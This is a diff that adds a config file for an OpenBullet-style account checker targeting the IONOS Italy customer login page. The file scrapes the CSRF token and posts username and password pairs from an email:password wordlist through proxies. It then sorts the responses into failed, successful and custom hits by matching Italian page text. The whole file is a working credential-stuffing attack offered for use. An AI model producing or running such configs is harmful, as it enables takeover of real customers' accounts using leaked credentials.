@@ -1,0 +1,55 @@
+[SETTINGS]
+{
+  "Name": "IonosIT",
+  "SuggestedBots": 35,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-27T09:06:14.7519258+08:00",
+  "AdditionalInfo": "",
+  "Author": "@fxck_love",
+  "Version": "1.1.2",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://login.ionos.it/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#CSRF PARSE "<SOURCE>" LR "name=\"oaologin.csrf\" value=\"" "\"><legend " -> VAR "Csrf" 
+
+REQUEST POST "https://login.ionos.it/" 
+  CONTENT "__lf=Login&__sendingdata=1&oaologin.fp=4ad8ff7fec21bc488699531468865063&oaologin.autofillUsername=&oaologin.autofillPassword=&oaologin.csrf=<Csrf>&oaologin.username=<USER>&oaologin.password=<PASS>&__SBMT%3Ad0e721d0%3A=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://login.ionos.it" 
+  HEADER "Referer: https://login.ionos.it/" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "La password inserita non " 
+  KEYCHAIN Success OR 
+    KEY "Buongiorno " 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "possibile eseguire l'accesso all'Area Clienti  " 
+
